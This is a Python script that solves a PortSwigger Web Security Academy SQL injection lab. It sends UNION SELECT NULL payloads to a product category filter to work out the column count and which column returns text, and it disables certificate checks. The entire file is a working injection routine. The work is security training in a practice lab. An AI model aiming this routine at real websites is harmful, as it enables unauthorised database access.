import requests
import urllib3
import bs4

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def word_finding(text, s):
    soup = bs4.BeautifulSoup(text, "html.parser")
    return s in soup.get_text()


def type_determination(session, url, payload, s, comment):
    parts = payload.split("NULL")
    for i in range(len(parts) - 1):
        test_payload = ""
        for j in range(len(parts) - 1):
            if i == j:
                test_payload += parts[j] + f"'{s}'"
            else:
                test_payload += parts[j] + "NULL"
        test_payload += parts[-1]
        response = session.get(url + test_payload + comment, verify=False)
        if response.status_code == 200 and word_finding(response.text, s):
            return test_payload
    return None




def main ():
    
    host = "https://0ad600c4041034ad83e04bb7009600e6.web-security-academy.net"
    product_url = f'{host}/filter?category=Accessories'
    comment = "--"
    apostrophe = "'"
    null = "NULL"
    comma = ","
    space = " "
    union = "UNION"
    select = "SELECT"
    payload = apostrophe + space + union + space + select + space + null 
    s = "2O2VS3"

    session = requests.Session()
    solved = False
    max_columns = 20

    for count in range(1, max_columns + 1):
        attempt_payload = payload + (comma + null) * (count - 1)
        attack_url = f"{product_url}{attempt_payload}{comment}"
        response = session.get(attack_url, verify=False)
        if response.status_code == 200:
            successful_payload = type_determination(session, product_url, attempt_payload, s, comment)
            if successful_payload:
                print("Koated !!!")
                print(f"Successful payload with {count} columns:")
                print(successful_payload)
                solved = True
                break

    if not solved:
        print("siks")


if __name__== "__main__" :
    main()
